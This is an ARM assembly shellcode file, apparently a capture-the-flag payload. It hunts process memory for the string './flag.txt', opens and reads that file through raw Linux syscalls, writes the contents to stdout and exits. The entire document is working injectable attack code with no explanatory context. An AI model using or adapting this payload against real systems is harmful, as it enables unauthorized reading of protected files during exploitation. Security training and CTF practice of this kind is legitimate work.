.section .text
.global shellcode
.arm

shellcode:
  # r0 = execp
  # r1 = new stack
  # r2 = some pointer

  # load ./fl into r3
  MOVW r3, #0x2f2e
  MOVT r3, #0x6c66
  # load ag.t into r4
  MOVW r4, #0x6761
  MOVT r4, #0x742e
hunt:
  LDR r5, [r2, #0x4]!
  TEQ r5, r3
  BNE hunt
  LDR r5, [r2, #0x4]
  TEQ r5, r4
  BNE hunt
  # r2 should now have the address of ./flag.txt

  # SYS_open
  MOVW r7, #5
  MOV r0, r2
  MOVW r1, #0
  MOVW r2, #0
  SWI #0

  # SYS_read
  MOVW r7, #3
  MOV r1, sp
  MOV r2, #0xFF
  SWI #0

  # SYS_write
  MOVW r7, #4
  MOV r2, r0
  MOV r1, sp
  MOVW r0, #1
  SWI #0

  # SYS_exit
  MOVW r7, #1
  MOVW r0, #0
  SWI #0
